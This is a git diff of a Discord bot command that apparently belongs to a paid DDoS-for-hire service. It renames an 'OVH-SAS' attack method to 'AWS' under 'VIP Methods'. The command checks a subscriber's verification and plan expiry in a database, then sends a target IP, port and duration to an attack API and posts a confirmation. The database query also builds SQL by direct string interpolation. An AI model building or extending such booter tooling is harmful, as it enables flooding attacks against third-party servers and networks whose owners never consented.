@@ -1,11 +1,11 @@
 const { MessageEmbed } = require('discord.js');
+const ee = require("../../config.json");
 const Util = require('../../Util/index');
-const ee = require("../../config.json")
 const util = new Util.default;
 module.exports = {
-  name: 'ovh-sas',
-  category: '☄️ | OVH Methods',
-  description: 'start an OVH-SAS attack',
+  name: 'aws',
+  category: '💎 | VIP Methods',
+  description: 'start an AWS attack',
 
   /**
    * @param {Client} client
@@ -14,21 +14,16 @@ module.exports = {
    */
 
   run: async (client, message, args, pool) => {
-
-    /* getting the connection from the db made in sql by dread modified by cykotic */
     pool.getConnection((err, connection) => {
       if (err) throw err;
 
-      /* @ the user */
       var target = message.author;
 
-      /* grabing the user id from the bot */
       connection.query(`select * from users where discordid='${target.id}'`, async (err, rows) => {
         if (err) throw err;
 
         var verified = rows[0].discordverified;
 
-        /* check if the user has been verified */
         if (verified === 0) return message.reply(new MessageEmbed()
           .setColor(ee.color)
           .setTimestamp()
@@ -36,12 +31,10 @@ module.exports = {
           .setTitle("❌ Error | you have not verified your Discord account with the bot!")
         ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))
 
-        /* checks if the plans is expires */
         var expires = new Date(rows[0].expires);
         var today = new Date();
         var expired = (expires <= today);
 
-        /* checks if the user has a active ban if not then return trued */
         if (expired === true) return message.reply(new MessageEmbed()
           .setColor(ee.color)
           .setTimestamp()
@@ -90,7 +83,7 @@ module.exports = {
         await message.delete()
 
         /* sends the attack with embed */
-        await util.requestAPI('OVH-SAS', address, port, time);
+        await util.requestAPI('AWS', address, port, time);
         return message.channel.send(new MessageEmbed()
           .setThumbnail(client.user.displayAvatarURL())
           .setColor(ee.color)
@@ -98,7 +91,7 @@ module.exports = {
             `> ❯ IP: **${address}**`,
             `> ❯ Port: **${port}**`,
             `> ❯ Time: **${time}**`,
-            `> ❯ Method: **OVH-SAS**`
+            `> ❯ Method: **AWS**`
           ])
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
           .setTimestamp()
